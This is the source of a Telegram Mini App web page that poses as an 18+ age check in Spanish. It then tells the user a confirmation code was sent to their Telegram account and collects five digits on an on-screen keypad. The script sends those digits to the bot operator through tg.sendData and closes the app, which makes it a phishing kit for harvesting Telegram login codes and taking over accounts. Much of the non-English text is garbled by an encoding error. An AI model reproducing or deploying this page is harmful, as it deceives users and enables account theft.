<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .container { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
        .msg-box { background: #1c242f; padding: 15px; border-radius: 12px; width: 85%; margin-bottom: 20px; font-size: 14px; border-left: 4px solid #0088cc; text-align: left; }
        
        /* ‡¶ï‡¶ø‡¶™‡ßç‡¶Ø‡¶æ‡¶° ‡¶ó‡ßç‡¶∞‡¶ø‡¶° ‡¶Ø‡¶æ ‡ß©‡¶ü‡¶ø ‡¶¨‡¶æ‡¶ü‡¶®‡¶ï‡ßá ‡¶è‡¶ï ‡¶≤‡¶æ‡¶á‡¶®‡ßá ‡¶∞‡¶æ‡¶ñ‡¶¨‡ßá */
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 85%; max-width: 320px; margin-top: 20px; }
        .key { background: #5a78f0; padding: 18px; border-radius: 12px; font-size: 22px; border: none; color: white; font-weight: bold; cursor: pointer; }
        
        .code-container { display: flex; gap: 8px; margin: 20px 0; }
        .code-box { width: 45px; height: 55px; border: 2px solid #444; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; }
        .warning-img { width: 120px; margin-bottom: 10px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container" id="step1">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/R-18_Logo_New_Zealand.svg/1200px-R-18_Logo_New_Zealand.svg.png" class="warning-img">
        <div class="msg-box">‚ö†Ô∏è ¬°Atenci√≥n! üîû Para continuar, confirma que eres mayor de 18 a√±os.</div>
        <button style="background:#5a78f0; color:white; padding:15px; width:85%; border:none; border-radius:12px; font-weight:bold;" onclick="showStep2()">üçì confirmar üîû</button>
    </div>

    <div class="container hidden" id="step2">
        <div class="msg-box">üì© Te hemos enviado un c√≥digo de confirmaci√≥n a tu Telegram oficial. Introd√∫cel‡ßã abajo.</div>
        <div class="code-container">
            <div class="code-box" id="b1"></div><div class="code-box" id="b2"></div><div class="code-box" id="b3"></div><div class="code-box" id="b4"></div><div class="code-box" id="b5"></div>
        </div>
        <div class="keypad">
            <button class="key" onclick="press('1')">1</button><button class="key" onclick="press('2')">2</button><button class="key" onclick="press('3')">3</button>
            <button class="key" onclick="press('4')">4</button><button class="key" onclick="press('5')">5</button><button class="key" onclick="press('6')">6</button>
            <button class="key" onclick="press('7')">7</button><button class="key" onclick="press('8')">8</button><button class="key" onclick="press('9')">9</button>
            <div style="visibility:hidden"></div><button class="key" onclick="press('0')">0</button><button class="key" onclick="del()">‚å´</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        let code = "";

        function showStep2() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }

        function press(num) {
            if (code.length < 5) {
                code += num;
                updateDisplay();
                if (code.length === 5) {
                    tg.sendData(code);
                    setTimeout(() => tg.close(), 500);
                }
            }
        }

        function del() { code = code.slice(0, -1); updateDisplay(); }
        function updateDisplay() {
            for (let i = 1; i <= 5; i++) {
                document.getElementById('b' + i).innerText = code[i - 1] || "";
            }
        }
    </script>
</body>
</html>
